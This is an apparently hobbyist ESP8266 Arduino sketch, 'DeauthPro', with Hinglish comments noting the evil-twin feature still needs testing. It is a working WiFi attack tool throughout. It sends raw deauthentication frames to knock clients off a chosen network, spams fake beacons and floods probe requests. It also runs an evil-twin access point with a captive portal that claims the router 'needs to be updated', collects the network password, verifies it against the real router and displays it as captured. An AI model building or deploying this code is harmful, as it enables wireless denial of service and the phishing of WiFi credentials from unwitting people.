
// 192.168.4.1 pe ip adress web interface dikh hi nahi raha 
// mene evil win to kr diya hai but run krke dekhna padega abbb (tesitng )

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <SSD1306Wire.h>

extern "C" {
  #include "user_interface.h"
}

// OLED Configuration
#define OLED_SDA 4      // D2 (GPIO4)
#define OLED_SCL 5      // D1 (GPIO5) 
#define OLED_ADDR 0x3C
SSD1306Wire display(OLED_ADDR, OLED_SDA, OLED_SCL);

// Button Configuration
#define BTN_UP 14       // D5 (GPIO14)
#define BTN_OK 13       // D7 (GPIO13)
#define BTN_DOWN 12     // D6 (GPIO12)

// LED Indicator
#define LED_PIN 2       // D4 (GPIO2) - built-in LED

// App Configuration
#define VERSION "2.0-DeauthPro"
#define MAX_APS 100
#define MAX_SSIDS 50
#define CHANNEL_HOP_INTERVAL 500
#define DEAUTH_PACKETS_PER_SECOND 200

// Menu States
enum MenuState {
  HOME_SCREEN,
  SCAN_NETWORKS,
  SCAN_RESULTS,
  SELECT_NETWORK,
  ATTACK_MENU,
  DEAUTH_ATTACK,
  EVIL_TWIN_ATTACK,
  BEACON_ATTACK,
  PROBE_ATTACK,
  SETTINGS,
  ABOUT
};

// Attack Modes
enum AttackMode {
  ATTACK_OFF,
  ATTACK_DEAUTH,
  ATTACK_EVIL_TWIN,
  ATTACK_BEACON,
  ATTACK_PROBE
};

// Network Structure (from reference code)
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

// Global Variables
MenuState currentMenu = HOME_SCREEN;
AttackMode currentAttack = ATTACK_OFF;
uint8_t currentChannel = 1;
bool channelHop = true;
uint32_t lastScanTime = 0;
uint32_t packetsSent = 0;
uint32_t deauthPackets = 0;
uint32_t beaconPackets = 0;
uint32_t probePackets = 0;
uint8_t selectedNetwork = 0;
uint8_t menuPosition = 0;
unsigned long attackStartTime = 0;

// Network Lists (from reference code)
_Network _networks[16];
_Network _selectedNetwork;
String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;

// Web Server
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// SSID List for Beacon/Probe
String beaconSSIDs[MAX_SSIDS] = {
  "Free WiFi", "Airport_Free", "Starbucks_Free", "Hotel_Guest", 
  "Public_WiFi", "CoffeeShop", "Library_Free", "Mall_WiFi"
};
uint8_t ssidCount = 8;

// Function declarations
void initDisplay();
void updateDisplay();
void initButtons();
void handleButtons();
void initWiFi();
void performScan();
void startAttack(AttackMode mode);
void stopAttack();
void executeAttack();
void sendDeauth(_Network network);
void sendBeacon(String ssid, uint8_t ch);
void sendProbe(String ssid, uint8_t ch);
void initWebServer();

// Evil Twin functions from reference code
void handleIndex();
void handleResult();
void handleAdmin();
void clearArray();
String bytesToStr(const uint8_t* b, uint32_t size);

void initDisplay() {
  display.init();
  display.flipScreenVertically();
  display.setFont(ArialMT_Plain_10);
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.clear();
  display.display();
}

void updateDisplay() {
  display.clear();
  
  String header = "DeauthPro v" + String(VERSION);
  display.drawString(0, 0, header);
  display.drawLine(0, 12, 128, 12);
  
  switch (currentMenu) {
    case HOME_SCREEN:
      display.drawString(0, 15, "1. Scan Networks");
      display.drawString(0, 27, "2. Attack Menu");
      display.drawString(0, 39, "3. Settings");
      display.drawString(0, 51, "4. About");
      display.drawString(120, 15 + (menuPosition * 12), ">");
      break;
      
    case SCAN_NETWORKS:
      display.drawString(0, 15, "Scanning...");
      display.drawString(0, 27, "Channel: " + String(currentChannel));
      display.drawString(0, 39, "APs Found: " + String(getNetworkCount()));
      display.drawString(0, 51, "Press OK to view results");
      break;
      
    case SCAN_RESULTS:
      display.drawString(0, 15, "Networks: " + String(getNetworkCount()));
      if (getNetworkCount() > 0) {
        uint8_t startIdx = menuPosition;
        if (startIdx >= getNetworkCount()) startIdx = getNetworkCount() - 1;
        
        String ssid = _networks[startIdx].ssid;
        if (ssid.length() > 16) ssid = ssid.substring(0, 16) + "...";
        
        display.drawString(0, 27, ssid);
        display.drawString(0, 39, "Ch:" + String(_networks[startIdx].ch));
        display.drawString(0, 51, String(startIdx + 1) + "/" + String(getNetworkCount()));
      }
      break;
      
    case ATTACK_MENU:
      display.drawString(0, 15, "1. Deauth Attack");
      display.drawString(0, 27, "2. Evil Twin");
      display.drawString(0, 39, "3. Beacon Spam");
      display.drawString(0, 51, "4. Probe Flood");
      display.drawString(120, 15 + (menuPosition * 12), ">");
      break;
      
    case DEAUTH_ATTACK:
      display.drawString(0, 15, "DEAUTH ATTACK");
      display.drawString(0, 27, "Pkts: " + String(deauthPackets));
      display.drawString(0, 39, "Time: " + String((millis() - attackStartTime) / 1000) + "s");
      display.drawString(0, 51, "Ch:" + String(currentChannel));
      break;
      
    case EVIL_TWIN_ATTACK:
      display.drawString(0, 15, "EVIL TWIN");
      display.drawString(0, 27, "SSID: " + _selectedNetwork.ssid.substring(0, 12));
      display.drawString(0, 39, "Clients: " + String(WiFi.softAPgetStationNum()));
      if (!_tryPassword.isEmpty()) {
        display.drawString(0, 51, "Pass: " + _tryPassword.substring(0, 10));
      } else {
        display.drawString(0, 51, "Running...");
      }
      break;
      
    case BEACON_ATTACK:
      display.drawString(0, 15, "BEACON SPAM");
      display.drawString(0, 27, "Pkts: " + String(beaconPackets));
      display.drawString(0, 39, "SSIDs: " + String(ssidCount));
      display.drawString(0, 51, "Ch:" + String(currentChannel));
      break;
      
    case PROBE_ATTACK:
      display.drawString(0, 15, "PROBE FLOOD");
      display.drawString(0, 27, "Pkts: " + String(probePackets));
      display.drawString(0, 39, "SSIDs: " + String(ssidCount));
      display.drawString(0, 51, "Ch:" + String(currentChannel));
      break;
      
    case SETTINGS:
      display.drawString(0, 15, "Settings Menu");
      display.drawString(0, 27, "1. Channel: " + String(currentChannel));
      display.drawString(0, 39, "2. Channel Hop: " + String(channelHop ? "ON" : "OFF"));
      display.drawString(0, 51, "3. Back");
      display.drawString(120, 27 + (menuPosition * 12), ">");
      break;
      
    case ABOUT:
      display.drawString(0, 15, "DeauthPro v" + String(VERSION));
      display.drawString(0, 27, "ESP8266 Deauther");
      display.drawString(0, 39, "Web Interface:");
      display.drawString(0, 51, "192.168.4.1");
      break;
  }
  
  display.display();
}

void initButtons() {
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
}

void handleButtons() {
  static unsigned long lastButtonPress = 0;
  if (millis() - lastButtonPress < 200) return;
  
  // UP Button
  if (digitalRead(BTN_UP) == LOW) {
    lastButtonPress = millis();
    
    switch (currentMenu) {
      case HOME_SCREEN:
      case ATTACK_MENU:
      case SETTINGS:
        menuPosition = (menuPosition - 1 + 4) % 4;
        break;
      case SCAN_RESULTS:
        if (menuPosition > 0) menuPosition--;
        break;
      case DEAUTH_ATTACK:
      case EVIL_TWIN_ATTACK:
      case BEACON_ATTACK:
      case PROBE_ATTACK:
        stopAttack();
        currentMenu = ATTACK_MENU;
        break;
    }
  }
  
  // DOWN Button
  if (digitalRead(BTN_DOWN) == LOW) {
    lastButtonPress = millis();
    
    switch (currentMenu) {
      case HOME_SCREEN:
      case ATTACK_MENU:
      case SETTINGS:
        menuPosition = (menuPosition + 1) % 4;
        break;
      case SCAN_RESULTS:
        if (menuPosition < getNetworkCount() - 1) menuPosition++;
        break;
      case DEAUTH_ATTACK:
      case EVIL_TWIN_ATTACK:
      case BEACON_ATTACK:
      case PROBE_ATTACK:
        // Do nothing during attacks
        break;
    }
  }
  
  // OK Button
  if (digitalRead(BTN_OK) == LOW) {
    lastButtonPress = millis();
    
    switch (currentMenu) {
      case HOME_SCREEN:
        if (menuPosition == 0) {
          currentMenu = SCAN_NETWORKS;
          performScan();
        } else if (menuPosition == 1) {
          currentMenu = ATTACK_MENU;
          menuPosition = 0;
        } else if (menuPosition == 2) {
          currentMenu = SETTINGS;
          menuPosition = 0;
        } else if (menuPosition == 3) {
          currentMenu = ABOUT;
        }
        break;
        
      case SCAN_NETWORKS:
        if (getNetworkCount() > 0) {
          currentMenu = SCAN_RESULTS;
          menuPosition = 0;
        } else {
          currentMenu = HOME_SCREEN;
        }
        break;
        
      case SCAN_RESULTS:
        // Select network for Evil Twin
        _selectedNetwork = _networks[menuPosition];
        currentMenu = ATTACK_MENU;
        menuPosition = 1; // Select Evil Twin option
        break;
        
      case ATTACK_MENU:
        if (menuPosition == 0) {
          startAttack(ATTACK_DEAUTH);
        } else if (menuPosition == 1) {
          if (_selectedNetwork.ssid != "") {
            startAttack(ATTACK_EVIL_TWIN);
          }
        } else if (menuPosition == 2) {
          startAttack(ATTACK_BEACON);
        } else if (menuPosition == 3) {
          startAttack(ATTACK_PROBE);
        }
        break;
        
      case SETTINGS:
        if (menuPosition == 0) {
          currentChannel = (currentChannel % 13) + 1;
        } else if (menuPosition == 1) {
          channelHop = !channelHop;
        } else if (menuPosition == 2) {
          currentMenu = HOME_SCREEN;
        }
        break;
        
      case ABOUT:
        currentMenu = HOME_SCREEN;
        break;
    }
  }
}

void initWiFi() {
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP_STA);
  
  // Configure Access Point - YOUR CREDENTIALS:
  // SSID: "DeauthPro"
  // Password: "deauth123"
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("DeauthPro", "deauth123");
  
  dnsServer.start(DNS_PORT, "*", apIP);
  WiFi.setOutputPower(20.5);
  WiFi.setPhyMode(WIFI_PHY_MODE_11N);
}

// From reference code - modified
void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

// From reference code
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
  lastScanTime = millis();
}

uint8_t getNetworkCount() {
  for (uint8_t i = 0; i < 16; i++) {
    if (_networks[i].ssid == "") {
      return i;
    }
  }
  return 16;
}

void startAttack(AttackMode mode) {
  if (currentAttack != ATTACK_OFF) {
    stopAttack();
  }
  
  currentAttack = mode;
  packetsSent = 0;
  deauthPackets = 0;
  beaconPackets = 0;
  probePackets = 0;
  attackStartTime = millis();
  digitalWrite(LED_PIN, HIGH);
  
  switch (mode) {
    case ATTACK_DEAUTH:
      currentMenu = DEAUTH_ATTACK;
      deauthing_active = true;
      break;
    case ATTACK_EVIL_TWIN:
      // Set up evil twin exactly like reference code
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
      currentMenu = EVIL_TWIN_ATTACK;
      break;
    case ATTACK_BEACON:
      currentMenu = BEACON_ATTACK;
      break;
    case ATTACK_PROBE:
      currentMenu = PROBE_ATTACK;
      break;
    default:
      break;
  }
}

void stopAttack() {
  if (currentAttack == ATTACK_EVIL_TWIN) {
    // Restore original AP exactly like reference code
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("DeauthPro", "deauth123");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  } else if (currentAttack == ATTACK_DEAUTH) {
    deauthing_active = false;
  }
  
  currentAttack = ATTACK_OFF;
  digitalWrite(LED_PIN, LOW);
  currentMenu = ATTACK_MENU;
}

void executeAttack() {
  if (currentAttack == ATTACK_OFF) return;
  
  static unsigned long lastDeauthTime = 0;
  static unsigned long lastBeaconTime = 0;
  static unsigned long lastProbeTime = 0;
  static unsigned long lastChannelHop = 0;
  
  unsigned long currentTime = millis();
  
  // Channel hopping
  if (channelHop && currentTime - lastChannelHop > CHANNEL_HOP_INTERVAL) {
    lastChannelHop = currentTime;
    currentChannel = (currentChannel % 13) + 1;
    wifi_set_channel(currentChannel);
  }
  
  switch (currentAttack) {
    case ATTACK_DEAUTH:
      // Send deauth packets at extreme rate
      if (currentTime - lastDeauthTime > (1000 / DEAUTH_PACKETS_PER_SECOND)) {
        lastDeauthTime = currentTime;
        
        if (_selectedNetwork.ssid != "") {
          sendDeauth(_selectedNetwork);
          deauthPackets++;
          packetsSent++;
        }
      }
      break;
      
    case ATTACK_BEACON:
      if (currentTime - lastBeaconTime > 100) {
        lastBeaconTime = currentTime;
        sendBeacon(beaconSSIDs[random(ssidCount)], currentChannel);
        beaconPackets++;
        packetsSent++;
      }
      break;
      
    case ATTACK_PROBE:
      if (currentTime - lastProbeTime > 100) {
        lastProbeTime = currentTime;
        sendProbe(beaconSSIDs[random(ssidCount)], currentChannel);
        probePackets++;
        packetsSent++;
      }
      break;
      
    case ATTACK_EVIL_TWIN:
      // Evil twin runs automatically as an AP
      // No additional packet sending needed
      break;
      
    default:
      break;
  }
}

// From reference code - modified
void sendDeauth(_Network network) {
  wifi_set_channel(network.ch);

  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
                              0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
                              0xFF, 0x00, 0x00, 0x01, 0x00};

  memcpy(&deauthPacket[10], network.bssid, 6);
  memcpy(&deauthPacket[16], network.bssid, 6);
  deauthPacket[24] = 1;

  // Send multiple deauth packets for extreme effect
  deauthPacket[0] = 0xC0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  deauthPacket[0] = 0xA0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

void sendBeacon(String ssid, uint8_t ch) {
  wifi_set_channel(ch);
  
  uint8_t beaconPacket[128] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00
  };
  
  uint8_t ssidLen = ssid.length();
  beaconPacket[37] = ssidLen;
  memcpy(&beaconPacket[38], ssid.c_str(), ssidLen);
  
  wifi_send_pkt_freedom(beaconPacket, 38 + ssidLen, 0);
}

void sendProbe(String ssid, uint8_t ch) {
  wifi_set_channel(ch);
  
  uint8_t probePacket[128] = {
    0x40, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x00
  };
  
  uint8_t ssidLen = ssid.length();
  probePacket[24] = ssidLen;
  memcpy(&probePacket[25], ssid.c_str(), ssidLen);
  
  wifi_send_pkt_freedom(probePacket, 25 + ssidLen + 10, 0);
}

// From reference code
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

// From reference code - modified
void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("DeauthPro", "deauth123");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
  }
}

// From reference code - modified for our interface
String _tempHTML = R"=====(
<!DOCTYPE html>
<html>
<head>
  <title>DeauthPro v)=====" + String(VERSION) + R"=====(</title>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
    .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
    .header { background: #333; color: white; padding: 15px; border-radius: 5px; text-align: center; }
    .card { background: #fff; border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin: 10px 0; }
    .btn { background: #007bff; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
    .btn-stop { background: #dc3545; }
    .btn-scan { background: #28a745; }
    table { width: 100%; border-collapse: collapse; }
    th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
    th { background-color: #f2f2f2; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>DeauthPro v)=====" + String(VERSION) + R"=====(</h1>
      <p>Advanced WiFi Deauther with Evil Twin</p>
    </div>
)=====";

// From reference code - modified
void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      startAttack(ATTACK_DEAUTH);
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
      stopAttack();
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      if (_selectedNetwork.ssid != "") {
        startAttack(ATTACK_EVIL_TWIN);
      }
    } else if (webServer.arg("hotspot") == "stop") {
      stopAttack();
    }
    webServer.sendHeader("Location", "/");
    webServer.send(303);
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    _html += "<div class='card'><h2>Network List</h2>";
    _html += "<form method='post' action='/?scan=1'><button class='btn btn-scan'>Rescan Networks</button></form>";
    _html += "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;
      
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td>";
      
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;' disabled>Selected</button>";
      } else {
        _html += "<form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button>Select</button></form>";
      }
      _html += "</td></tr>";
    }
    _html += "</table></div>";

    _html += "<div class='card'><h2>Attack Controls</h2>";
    
    if (deauthing_active) {
      _html += "<form method='post' action='/?deauth=stop'><button class='btn btn-stop'>Stop Deauth</button></form>";
    } else {
      _html += "<form method='post' action='/?deauth=start'><button class='btn'";
if (_selectedNetwork.ssid == "") _html += " disabled";
_html += ">Start Deauth</button></form>";
    }

    if (hotspot_active) {
      _html += "<form method='post' action='/?hotspot=stop'><button class='btn btn-stop'>Stop EvilTwin</button></form>";
    } else {
      _html += "<form method='post' action='/?hotspot=start'><button class='btn'";
if (_selectedNetwork.ssid == "") _html += " disabled";
_html += ">Start EvilTwin</button></form>";
    }
    _html += "</div>";

    if (_correct != "") {
      _html += "<div class='card' style='background:#d4edda;'><h3>Password Captured!</h3><p>" + _correct + "</p></div>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {
    // Evil Twin captive portal
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
    } else {
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updated</h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
    }
  }
}

void handleAdmin() {
  handleIndex(); // Use same handler for admin
}

void initWebServer() {
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
}

void setup() {
  Serial.begin(115200);
  
  // Initialize components
  initDisplay();
  initButtons();
  initWiFi();
  initWebServer();
  
  // Configure LED
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  
  // Show startup screen
  display.clear();
  display.setFont(ArialMT_Plain_16);
  display.drawString(0, 0, "DeauthPro");
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 20, "v" + String(VERSION));
  display.drawString(0, 35, "Web: 192.168.4.1");
  display.drawString(0, 50, "SSID: DeauthPro");
  display.display();
  
  delay(3000);
  
  // Initial scan
  performScan();
}

void loop() {
  // Handle web server
  webServer.handleClient();
  dnsServer.processNextRequest();
  
  // Handle buttons
  handleButtons();
  
  // Execute current attack
  executeAttack();
  
  // Update display
  static unsigned long lastDisplayUpdate = 0;
  if (millis() - lastDisplayUpdate > 100) {
    lastDisplayUpdate = millis();
    updateDisplay();
  }
  
  // Auto-rescan every 30 seconds if not attacking
  if (currentAttack == ATTACK_OFF && millis() - lastScanTime > 30000) {
    performScan();
  }
  
  // Check WiFi status for Evil Twin password verification
  static unsigned long lastWifiCheck = 0;
  if (hotspot_active && millis() - lastWifiCheck > 2000) {
    lastWifiCheck = millis();
    // This is handled in the handleResult function
  }
}
